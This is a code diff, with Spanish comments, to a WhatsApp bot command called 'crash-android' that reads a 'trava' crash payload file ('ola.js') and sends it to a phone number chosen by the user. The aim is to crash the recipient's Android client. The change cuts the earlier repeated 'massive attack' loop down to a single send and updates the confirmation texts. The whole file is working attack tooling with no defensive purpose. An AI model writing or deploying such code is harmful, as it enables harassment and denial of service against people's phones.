@@ -13,7 +13,7 @@ const crashAndroidMisa = {
             const chat = m.key.remoteJid;
 
             if (!args[0]) {
-                const textoUso = `✧ ‧₊˚ *MISA CRASH x10* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]`;
+                const textoUso = `✧ ‧₊˚ *MISA CRASH x1* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: ${command} [número]`;
                 return await conn.sendMessage(chat, { text: textoUso }, { quoted: m });
             }
 
@@ -30,35 +30,27 @@ const crashAndroidMisa = {
 
             const contenidoTrava = fs.readFileSync(pathTrava, 'utf8');
 
-            // 1. Reacción de inicio de ataque
+            // 1. Reacción de inicio
             await conn.sendMessage(chat, { react: { text: '🚀', key: m.key } });
 
-            // 2. Bucle de envío (10 veces)
-            for (let i = 1; i <= 3; i++) {
-                try {
-                    // Enviamos la carga
-                    await conn.sendMessage(targetJid, { text: contenidoTrava });
-                    
-                    // Log en consola para que veas el progreso en SkyUltraPlus
-                    console.log(`[MISA-BOT] Carga ${i}/10 enviada a ${num}`);
-
-                    // Esperamos 2 segundos entre cada envío para evitar el baneo/bloqueo
-                    if (i < 10) await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                } catch (e) {
-                    console.error(`Error en el envío ${i}:`, e);
-                }
+            // 2. Envío único
+            try {
+                await conn.sendMessage(targetJid, { text: contenidoTrava });
+                console.log(`[MISA-BOT] Carga enviada a ${num}`);
+            } catch (e) {
+                console.error(`Error en el envío:`, e);
+                return await conn.sendMessage(chat, { text: '❌ Error al enviar la carga.' }, { quoted: m });
             }
 
             // 3. Confirmación final
             await conn.sendMessage(chat, { react: { text: '💀', key: m.key } });
             await conn.sendMessage(chat, { 
-                text: `✅ *Ataque Masivo Finalizado*\n> Se enviaron 10 ráfagas de 'ola.js' a @${num}`,
+                text: `✅ *Ataque Finalizado*\n> Se envió 1 ráfaga de 'ola.js' a @${num}`,
                 mentions: [targetJid]
             }, { quoted: m });
 
         } catch (err) {
-            console.error('Error en crash-android masivo:', err);
+            console.error('Error en crash-android:', err);
         }
     }
 };
